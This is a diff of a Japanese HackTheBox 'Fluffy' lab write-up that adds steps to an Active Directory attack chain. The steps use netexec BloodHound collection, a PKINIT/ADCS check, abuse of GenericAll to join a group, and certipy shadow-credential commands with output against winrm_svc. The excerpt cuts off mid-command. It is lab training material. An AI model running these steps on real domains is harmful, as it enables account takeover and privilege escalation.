@@ -205,7 +205,7 @@ LDAP        10.129.180.164  389    DC01             $krb5tgs$23$*winrm_svc$FLUFF
 ```
 
 
-## STEP 
+## STEP 3
 bloodhound実行
 ```sh
 └─$ netexec ldap 10.129.180.164 --dns-server 10.129.180.164 -u p.agila -p 'prometheusx-303' --bloodhound --collection All
@@ -215,10 +215,19 @@ LDAP        10.129.180.164  389    DC01             Resolved collection methods:
 LDAP        10.129.180.164  389    DC01             Done in 01M 02S
 LDAP        10.129.180.164  389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.180.164_2025-10-26_134930_bloodhound.zip
 ```
-winrm_svcにShadow Credentials攻撃パスを発見  
-https://eladshamir.com/2021/06/21/Shadow-Credentials.html  
+winrm_svcにshadowcredentialsを追加できるパスを発見  
+shadowcredentialsのわかりやすい記事は[こちら](https://eladshamir.com/2021/06/21/Shadow-Credentials.html)  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Fluffy_02.png">  
-追加
+ちなみにshadowcredentialsを悪用するために必要なpkinitが構成されていることを確認
+```sh
+└─$ netexec ldap 10.129.250.233 -u 'p.agila' -p 'prometheusx-303' -M adcs 
+LDAP        10.129.250.233  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
+LDAP        10.129.250.233  389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
+ADCS        10.129.250.233  389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
+ADCS        10.129.250.233  389    DC01             Found PKI Enrollment Server: DC01.fluffy.htb
+ADCS        10.129.250.233  389    DC01             Found CN: fluffy-DC01-CA
+```
+genericall権限を使用して、service accountsグループに加入
 ```sh
 └─$ impacket-net 'fluffy.htb/p.agila:prometheusx-303@10.129.180.164' group -name 'service accounts' -join p.agila
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -234,6 +243,38 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
   3. p.agila
   4. winrm_svc
 ```
+```sh
+└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.250.233 -account winrm_svc add
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
+[!] Use -debug to print a stacktrace
+[!] Failed to resolve: FLUFFY.HTB
+[*] Targeting user 'winrm_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'cb4bca07df824ab2b9fcdcc8d9637716'
+[*] Adding Key Credential with device ID 'cb4bca07df824ab2b9fcdcc8d9637716' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID 'cb4bca07df824ab2b9fcdcc8d9637716' to the Key Credentials for 'winrm_svc'
+[*] Saving certificate and private key to 'winrm_svc.pfx'
+[*] Saved certificate and private key to 'winrm_svc.pfx'
+ 
+└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.250.233 -account winrm_svc list
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
+[!] Use -debug to print a stacktrace
+[!] Failed to resolve: FLUFFY.HTB
+[*] Targeting user 'winrm_svc'
+[*] Listing Key Credentials for 'winrm_svc'
+[*] DeviceID: cb4bca07df824ab2b9fcdcc8d9637716 | Creation Time (UTC): 2025-10-27 00:29:31
+```
+
+
+
+genericwrite権限を使用してshadowcredentialswを追加し、tgt取得
+ここでntハッシュも取得しているが
 ```sh
 └─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.250.233 -account winrm_svc auto
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
